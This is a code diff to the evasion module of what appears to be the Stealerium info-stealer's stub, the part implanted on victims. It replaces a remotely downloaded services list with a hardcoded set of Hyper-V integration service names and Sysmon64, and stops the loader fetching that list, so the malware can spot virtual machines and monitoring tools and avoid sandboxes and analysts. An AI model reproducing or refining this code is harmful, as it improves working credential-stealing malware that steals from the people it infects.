@@ -28,7 +28,6 @@ namespace Stealerium.Stub.Modules.Implant
             { "PCNames", BaseUrl + "pc_name_list.txt" },
             { "GPUs", BaseUrl + "gpu_list.txt" },
             { "Processes", BaseUrl + "processes_list.txt" },
-            { "Services", BaseUrl + "services_list.txt" },
             { "IPs", BaseUrl + "ip_list.txt" },
             { "MachineGuids", BaseUrl + "MachineGuid.txt" }
         };
@@ -40,7 +39,19 @@ namespace Stealerium.Stub.Modules.Implant
             { "PCNames", null },
             { "GPUs", null },
             { "Processes", null },
-            { "Services", null },
+            {
+                "Services", new HashSet<string>(StringComparer.OrdinalIgnoreCase)
+                {
+                    "vmicheartbeat",
+                    "vmickvpexchange",
+                    "vmicrdv",
+                    "vmicshutdown",
+                    "vmictimesync",
+                    "vmicvss",
+                    "VmRemoteService",
+                    "Sysmon64"
+                }
+            },
             { "IPs", null },
             { "MachineGuids", null }
         };
@@ -95,7 +106,9 @@ namespace Stealerium.Stub.Modules.Implant
         /// <returns>A Task representing the asynchronous operation.</returns>
         private static async Task EnsureAllListsLoadedAsync()
         {
-            var loadTasks = ListUrls.Keys.Select(key => LoadListAsync(key));
+            var loadTasks = ListUrls.Keys
+                .Where(key => key != "Services")
+                .Select(key => LoadListAsync(key));
             await Task.WhenAll(loadTasks).ConfigureAwait(false);
         }
 
